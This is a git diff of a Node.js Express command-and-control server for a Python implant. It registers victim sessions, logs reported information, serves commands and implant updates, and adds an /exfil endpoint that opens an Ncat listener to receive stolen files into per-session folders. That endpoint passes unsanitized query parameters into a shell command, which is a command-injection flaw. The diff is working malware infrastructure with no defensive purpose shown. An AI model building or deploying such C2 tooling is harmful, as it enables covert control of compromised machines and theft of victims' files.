@@ -3,6 +3,7 @@ const fs = require('fs')
 const hostname = 'localhost';
 const port = 443;
 var session = require('express-session');
+const { exec } = require("child_process");
 
 const app = express();
 
@@ -17,7 +18,8 @@ app.use(session({
 app.get('/', (req, res) => {
 	sid = req.sessionID;
 	console.log((`${sid} has connected`));
-	fs.writeFile(`Sessions/${sid}.log`, "Connection Established\n", err => {
+	fs.mkdirSync(`Sessions/${sid}`);
+	fs.writeFile(`Sessions/${sid}/${sid}.log`, "Connection Established\n", err => {
   		if (err) console.error(err)
 	})
 	res.send(`${sid}`);
@@ -29,7 +31,7 @@ app.get('/info', (req, res) => {
 		var sid = req.query.sid;
         var InfoText = req.query.info;
         console.log(`${sid}: ${InfoText}`)
-		fs.appendFile(`Sessions/${sid}.log`, `${InfoText}\n`, err => {
+		fs.appendFile(`Sessions/${sid}/${sid}.log`, `${InfoText}\n`, err => {
 		  	if (err) console.error(err)
 		})
     }
@@ -43,6 +45,20 @@ app.get('/retrcommand', (req, res) => {
 
 app.get('/updateImplant', (req, res) => {
     res.download('Implant/implant.py')
+});
+
+app.get('/exfil', (req, res) => {
+	async function OpenExfilPort () {
+		var sid = req.query.sid;
+		var fileName = req.query.file;
+		await exec(`Ncat -lp 1234 > Sessions/${sid}/${fileName}`, (err, stdout, stderr) => {
+    		if (err) console.error(err)
+    		if (stderr) console.error(stderr)
+    		console.log(`${sid} has transferred a file.`);
+		});
+	}
+	OpenExfilPort()
+	res.send()
 });
 
 app.listen(port, hostname);
